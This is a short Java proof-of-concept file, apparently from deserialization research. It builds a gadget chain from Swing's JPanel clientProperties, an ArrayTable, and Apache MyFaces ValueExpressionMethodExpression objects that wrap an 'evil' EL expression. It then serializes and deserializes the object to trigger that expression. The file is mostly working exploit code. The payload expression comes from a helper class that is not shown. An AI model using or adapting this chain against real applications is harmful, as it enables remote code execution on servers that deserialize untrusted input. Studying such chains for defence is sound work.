package com.example.Myface;

import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;
import com.example.Utils.Share;
import org.apache.myfaces.view.facelets.el.ValueExpressionMethodExpression;

import javax.el.ValueExpression;
import javax.swing.*;

public class POC_6 {

    /**
     * run with jComponent_equals.jar
     */

    public static void main(String[] args) throws Exception {
        ValueExpression evil = Share.getEvilExpression();
        ValueExpressionMethodExpression expression1 = new ValueExpressionMethodExpression(evil);
        ValueExpressionMethodExpression expression2 = new ValueExpressionMethodExpression(evil);

        JPanel j = new JPanel();
        Class atClass = Class.forName("javax.swing.ArrayTable");
        Object arrayTable = ReflectionUtil.createWithoutConstructor(atClass);
        Object[] table = new Object[]{expression1, "1", expression2, "2"};

        ReflectionUtil.setField(arrayTable, "table", table);
        ReflectionUtil.setField(j, "clientProperties", arrayTable);
        SerializeUtil.deserialize(SerializeUtil.serialize(j));
    }

}
